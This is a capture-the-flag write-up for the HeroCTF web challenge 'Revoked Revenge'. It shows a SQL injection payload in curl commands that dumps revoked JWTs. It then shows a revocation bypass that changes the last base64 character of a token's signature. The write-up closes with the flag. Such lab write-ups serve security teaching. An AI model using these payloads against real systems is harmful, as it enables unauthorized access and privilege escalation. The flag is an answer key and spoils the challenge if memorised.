# Revoked Revenge

### Category

Web

### Difficulty

Medium

### Author

Log_s

### Description

The chall maker forgot to remove a debug account... Here is the revenge challenge without this backdoor!

DEPLOY: [https://deploy.heroctf.fr](https://deploy.heroctf.fr)

### Files

- [main.py](challenge/app/main.py)

### Write Up

Once authenticated, the web application does not offer many interesting features. The search function seems interesting, and indeed, interesting a quote in the search field causes a crash:
```bash
$ curl -kIs --cookie 'JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6MCwiaXNzdWVkIjoxNzQ2NjE1NDQ2LjYxOTI1OTR9.dXO2q3-lJnbxNRSdEvIZuLOZU4W5LneGAcWubwBSKF0' "http://localhost:5000/employees?query='"
HTTP/1.1 500 INTERNAL SERVER ERROR
[...]
```
The presence of a SQL injection can be confirmed by looking at the code, in the `employees` function:
```python
def employees():
    query = request.args.get("query", "")
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        f"SELECT id, name, email, position FROM employees WHERE name LIKE '%{query}%'"
    )
```
The SQL request does not use prepared statements, making it vulnerable to SQL injections.

We are now able to recover the content of all the tables in the database. Let's recover the list of revoked tokens with the request `' UNION SELECT null,token,null,null FROM revoked_tokens--`:
```bash
$ curl -s --cookie 'JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6MCwiaXNzdWVkIjoxNzQ2NjE1NDQ2LjYxOTI1OTR9.dXO2q3-lJnbxNRSdEvIZuLOZU4W5LneGAcWubwBSKF0' "http://localhost:5000/employees?query='%20UNION%20SELECT%20null,token,null,null%20FROM%20revoked_tokens--" | grep "eyJ" | cut -d'>' -f2 | cut -d'<' -f1  
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc0NjYxNTQwNy42MzI3ODF9.PxcqULSC60KATtmYP7LHzK52HhlZMcWCa92Sy1W19SQ
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiaXNfYWRtaW4iOjAsImlzc3VlZCI6MTc0NjYxNTQwNy40MzU0Mzg0fQ.noSxtJERNcjz-bLmcEDeCfGbVaBI30n5RYQlDvlcShY
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiaXNfYWRtaW4iOjAsImlzc3VlZCI6MTc0NjYxNTQwNy44MjQ2NzgyfQ.a9APY2CGOAVnRu_fAKT1ZaoB8iAsUvLhQyKuLoRmfzQ
```

We are now in possession of revoked tokens, that cannot be used as is. However, this challenge revolves around revoked tokens, as the title strongly hints towards.

Let's take a look at how JWT session tokens are handled in the app. In the `login` function, a token is created as follows:

```python
token = jwt.encode(
    {
        "username": username,
        "is_admin": user["is_admin"],
        "issued": time.time(),
    },
    app.config["SECRET_KEY"],
    algorithm="HS256",
)
```
The first issue with these tokens is that there is an issue date, but no expiry date. This means that a token that is not revoked, can be used indefinitely.

Luckily, there is a revocation mechanism. Indeed, upon logout, the following request is made:
```sql
INSERT INTO revoked_tokens (token) VALUES (?)
```

Let's take a look at the authorization process, which happens in the middleware function `token_required`.
```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.cookies.get("JWT")
        if not token:
            flash("Token is missing!", "error")
            return redirect("/login")

        try:
            data = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
            username = data["username"]

            conn = get_db_connection()
            user = conn.execute(
                "SELECT id,is_admin FROM users WHERE username = ?", (username,)
            ).fetchone()
            revoked = conn.execute(
                "SELECT id FROM revoked_tokens WHERE token = ?", (token,)
            ).fetchone()
            conn.close()

            if not user or revoked:
                flash("Invalid or revoked token!", "error")
                return redirect("/login")

            request.is_admin = user["is_admin"]
            request.username = username

        except jwt.InvalidTokenError:
            flash("Invalid token!", "error")
            return redirect("/login")

        return f(*args, **kwargs)

    return decorated
```
This function does the following:
1. Check if a token is provided
2. Decodes the token using the secret key
3. Requests the database to check if the user exists
4. Check if the token is not in the revoked table of the database
5. Grant or deny access to the resource

The issue with the previous flow, is how the check for the revoked token is performed. Indeed, this checks if any matching string is found in the database.

However, JWT tokens are "url safe" base64 encoded. As explained in this thread ([https://security.stackexchange.com/questions/272746/jwt-able-to-change-signature-and-its-still-verified](https://security.stackexchange.com/questions/272746/jwt-able-to-change-signature-and-its-still-verified)), the last few bits in the signature do not matter and changing them will still result in a valid base64 encoded string that can be decoded. This means that by slightly changing the last character of the signature with another one with a close ASCII value (by incrementing the character for example), a revoked token could still be used.

Indeed, the modified token would still be valid, satisfying the steps 2 and 3 of the previously described flow, and would not strictly match any token from the database.

While writing this writeup, the token for the administrator is:
```plain
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc0NjYxNTQwNy42MzI3ODF9.PxcqULSC60KATtmYP7LHzK52HhlZMcWCa92Sy1W19SQ
```

By changing the last character from `Q` to `R` we successfully access the admin page.
```bash
$ curl -s --cookie 'JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlzc3VlZCI6MTc0NjYxNTQwNy42MzI3ODF9.PxcqULSC60KATtmYP7LHzK52HhlZMcWCa92Sy1W19SR' "http://localhost:5000/admin" | grep Hero
				<p>Congratz, here is your flag: Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}</p>
```

### Flag

Hero{N0t_th4t_r3v0k3d_37d75e49a6578b66652eca1cfe080e5b}
